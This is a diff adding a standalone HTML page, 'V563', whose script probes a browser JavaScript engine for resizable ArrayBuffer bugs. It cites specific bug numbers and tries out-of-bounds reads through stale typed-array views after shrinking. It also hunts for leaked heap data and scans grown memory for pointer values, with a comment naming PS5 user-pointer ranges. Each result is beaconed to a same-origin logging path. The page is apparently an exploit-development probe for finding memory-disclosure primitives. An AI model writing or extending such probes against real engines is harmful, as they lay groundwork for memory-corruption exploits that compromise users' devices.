@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V563</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V563-'+tag+'?d='+encodeURIComponent(String(data).substring(0,400))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+
+b('BOOT','V563-rab-probe');
+
+// T1: RAB basic — create, resize, verify
+(function(){
+  try{
+    var rab=new ArrayBuffer(1024,{maxByteLength:4096});
+    var ok=rab.resizable;
+    var bl=rab.byteLength;
+    var mbl=rab.maxByteLength;
+    rab.resize(512);
+    var bl2=rab.byteLength;
+    rab.resize(4096);
+    var bl3=rab.byteLength;
+    b('T1','resizable='+ok+'|bl='+bl+'|mbl='+mbl+'|after512='+bl2+'|after4096='+bl3);
+  }catch(e){b('T1','ERR:'+e.message)}
+})();
+
+// T2: View byteLength after shrink — Bug 285876 test
+// Create view, shrink RAB, check if view.byteLength returns stale value
+(function(){
+  try{
+    var rab=new ArrayBuffer(1024,{maxByteLength:4096});
+    var u8=new Uint8Array(rab);
+    var f64=new Float64Array(rab);
+    var blBefore=u8.byteLength;
+    var lenBefore=f64.length;
+    rab.resize(64);
+    var blAfter=u8.byteLength;
+    var lenAfter=f64.length;
+    // Key question: does JS see updated or stale length?
+    b('T2','u8-before='+blBefore+'|u8-after='+blAfter+'|f64-before='+lenBefore+'|f64-after='+lenAfter);
+  }catch(e){b('T2','ERR:'+e.message)}
+})();
+
+// T3: Offset view after shrink — does byteOffset stay valid?
+(function(){
+  try{
+    var rab=new ArrayBuffer(1024,{maxByteLength:4096});
+    var u8=new Uint8Array(rab,512,512); // offset=512, length=512
+    var boBefore=u8.byteOffset;
+    var blBefore=u8.byteLength;
+    rab.resize(256); // shrink past the view's offset
+    var boAfter=u8.byteOffset;
+    var blAfter=u8.byteLength;
+    // With bug 285876: boAfter=512, blAfter=512 (stale)
+    // Fixed: boAfter=0, blAfter=0
+    b('T3','bo-before='+boBefore+'|bl-before='+blBefore+'|bo-after='+boAfter+'|bl-after='+blAfter);
+    // Try to read from OOB view
+    var val='';
+    try{
+      val=u8[0];
+      b('T3-READ','u8[0]='+val+'|type='+(typeof val));
+    }catch(e2){b('T3-READ','ERR:'+e2.message)}
+  }catch(e){b('T3','ERR:'+e.message)}
+})();
+
+// T4: TypedArray subclass that returns RAB-backed array
+(function(){
+  try{
+    var rabRef=null;
+    class RABFloat64 extends Float64Array {
+      constructor(len){
+        var r=new ArrayBuffer(len*8,{maxByteLength:65536});
+        super(r);
+        rabRef=r;
+      }
+    }
+    var arr=new RABFloat64(100);
+    b('T4','subclass|len='+arr.length+'|bl='+arr.byteLength+'|rabBL='+rabRef.byteLength+'|rabMBL='+rabRef.maxByteLength);
+  }catch(e){b('T4','ERR:'+e.message)}
+})();
+
+// T5: TypedArray.from() with mapFn that resizes RAB — Bug 312513
+(function(){
+  try{
+    var rabRef=null;
+    var resized=false;
+    class RABFloat64 extends Float64Array {
+      constructor(len){
+        var r=new ArrayBuffer(len*8,{maxByteLength:65536});
+        super(r);
+        rabRef=r;
+      }
+    }
+    var result=RABFloat64.from({length:100,0:0,[Symbol.iterator]:undefined},function(v,i){
+      if(i===1&&!resized){
+        resized=true;
+        rabRef.resize(8); // shrink to 1 float64
+      }
+      return 42+i; // write known values
+    });
+    // After from(): result has length 100 but RAB is shrunk to 8 bytes (1 float64)
+    // If bug present: all 100 writes succeeded, we can read all 100
+    // If fixed: writes past index 0 were bounds-checked and rejected
+    var readResults=[];
+    for(var i=0;i<Math.min(result.length,10);i++){
+      try{ readResults.push('i'+i+'='+result[i]); }
+      catch(e){ readResults.push('i'+i+'=ERR'); break; }
+    }
+    b('T5','len='+result.length+'|rabBL='+rabRef.byteLength+'|resized='+resized+'|reads='+readResults.join('|'));
+  }catch(e){b('T5','ERR:'+e.message)}
+})();
+
+// T6: Same as T5 but read MORE elements — look for non-42+i values (heap data)
+(function(){
+  try{
+    var rabRef=null;
+    var resized=false;
+    class RABFloat64 extends Float64Array {
+      constructor(len){
+        var r=new ArrayBuffer(len*8,{maxByteLength:65536});
+        super(r);
+        rabRef=r;
+      }
+    }
+    var result=RABFloat64.from({length:200,0:0,[Symbol.iterator]:undefined},function(v,i){
+      if(i===1&&!resized){
+        resized=true;
+        rabRef.resize(8);
+      }
+      return 0xCAFE0000+i;
+    });
+    // Read elements 100-199 — these are past the original write range
+    // If they contain non-zero, non-CAFE values, that's leaked heap data
+    var nonZero=0;var nonCafe=0;var samples=[];
+    for(var i=0;i<200;i++){
+      try{
+        var v=result[i];
+        if(v!==undefined&&v!==0)nonZero++;
+        if(v!==undefined&&v!==0&&(v<0xCAFE0000||v>0xCAFE00FF))nonCafe++;
+        if(i<5||i>=95&&i<=105||i>=195) samples.push('i'+i+'='+(v===undefined?'undef':v));
+      }catch(e){break}
+    }
+    b('T6','len='+result.length+'|nonZero='+nonZero+'|nonCafe='+nonCafe+'|samples='+samples.join(','));
+  }catch(e){b('T6','ERR:'+e.message)}
+})();
+
+// T7: Uint8Array view of RAB — read raw bytes after resize
+(function(){
+  try{
+    var rab=new ArrayBuffer(256,{maxByteLength:4096});
+    var u8=new Uint8Array(rab);
+    // Fill with pattern
+    for(var i=0;i<256;i++) u8[i]=0xAA;
+    rab.resize(16);
+    // Read past shrunk boundary
+    var reads=[];
+    for(var i=0;i<32;i++){
+      try{ reads.push(u8[i]); }catch(e){ reads.push('E'); break; }
+    }
+    // First 16 should be 0xAA (our pattern), 16-31: 0xAA if memory retained, 0 if zeroed, undefined if bounds-checked
+    var summary='';
+    var first16=reads.slice(0,16).filter(function(v){return v===0xAA}).length;
+    var next16=reads.slice(16,32);
+    var nextNonZero=next16.filter(function(v){return v!==0&&v!==undefined&&v!=='E'}).length;
+    summary='first16_AA='+first16+'|next16_nonzero='+nextNonZero+'|raw='+next16.join(',');
+    b('T7',summary);
+  }catch(e){b('T7','ERR:'+e.message)}
+})();
+
+// T8: grow RAB and check if new bytes are zeroed or contain stale data
+(function(){
+  try{
+    var rab=new ArrayBuffer(64,{maxByteLength:4096});
+    var u8=new Uint8Array(rab);
+    for(var i=0;i<64;i++) u8[i]=0xBB;
+    // Grow to 4096
+    rab.resize(4096);
+    // Read bytes 64-127 — were they zeroed or contain stale heap data?
+    var stale=0;var samples=[];
+    for(var i=64;i<128;i++){
+      var v=u8[i];
+      if(v!==0) stale++;
+      if(i<72) samples.push(v);
+    }
+    b('T8','stale='+stale+'|samples64_71='+samples.join(','));
+  }catch(e){b('T8','ERR:'+e.message)}
+})();
+
+// T9: Shrink then grow — does grow expose stale data from before shrink?
+(function(){
+  try{
+    var rab=new ArrayBuffer(256,{maxByteLength:4096});
+    var u8=new Uint8Array(rab);
+    for(var i=0;i<256;i++) u8[i]=0xCC;
+    rab.resize(16); // shrink
+    rab.resize(256); // grow back
+    // Read bytes 16-31 — were they zeroed by shrink+grow or retained?
+    var retained=0;var samples=[];
+    for(var i=16;i<32;i++){
+      var v=u8[i];
+      if(v===0xCC) retained++;
+      samples.push(v.toString(16));
+    }
+    b('T9','retained='+retained+'|samples='+samples.join(','));
+  }catch(e){b('T9','ERR:'+e.message)}
+})();
+
+// T10: Large RAB grow — check for leaked heap pointers in grown region
+(function(){
+  try{
+    // Allocate some objects first to populate heap
+    var junk=[];
+    for(var i=0;i<1000;i++) junk.push({a:i,b:'x'.repeat(32)});
+
+    var rab=new ArrayBuffer(64,{maxByteLength:32768});
+    var dv=new DataView(rab);
+    rab.resize(32768);
+    // Scan for pointer-like values (look for 8-byte values in typical address ranges)
+    var interesting=[];
+    for(var off=64;off<32768-8;off+=8){
+      var lo=dv.getUint32(off,true);
+      var hi=dv.getUint32(off+4,true);
+      // PS5 user pointers typically 0x0000008XXXXXXX or similar
+      if(hi!==0&&hi<0x0001&&lo!==0){
+        interesting.push('off='+off+':'+hi.toString(16)+lo.toString(16));
+      }
+      if(interesting.length>=10) break;
+    }
+    b('T10','scanned|interesting='+interesting.length+'|'+(interesting.length?interesting.join(','):'none'));
+    junk=null;
+  }catch(e){b('T10','ERR:'+e.message)}
+})();
+
+b('DONE','V563-all-complete');
+</script>
+</body></html>
